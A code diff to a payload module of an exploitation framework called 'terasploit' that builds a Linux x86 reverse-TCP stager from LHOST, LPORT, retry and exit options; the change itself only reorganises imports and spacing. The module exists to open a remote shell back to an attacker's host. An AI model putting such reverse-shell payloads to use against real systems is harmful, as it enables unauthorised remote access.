@@ -1,7 +1,13 @@
 from collections.abc import Sequence
 
 from extension.payload.linux.x86.reverse_tcp import ReverseTcpX86
-from terasploit.module.payload import ARCH_X86, PLATFORM_LINUX, STAGER, Payload, PayloadHandler
+from libs.arch import ARCH_X86
+from libs.platform import PLATFORM_LINUX
+from terasploit.module.payload import (
+    STAGER,
+    Payload,
+    PayloadHandler,
+)
 
 
 class TerasploitModule(ReverseTcpX86, Payload):
@@ -32,9 +38,11 @@ class TerasploitModule(ReverseTcpX86, Payload):
         """Generate the Linux x86 reverse-TCP stager shellcode."""
         host = ctx.get_option("LHOST")
         port = int(ctx.get_option("LPORT"))
+
         retry_count = int(ctx.get_option("StagerRetryCount") or 10)
         sleep_seconds = float(ctx.get_option("StagerRetryWait") or 5.0)
         exitfunc = str(ctx.get_option("EXITFUNC") or "process").lower().strip()
+
         shellcode = self.generate_reverse_tcp(
             host=(host, port),
             retry_count=retry_count,
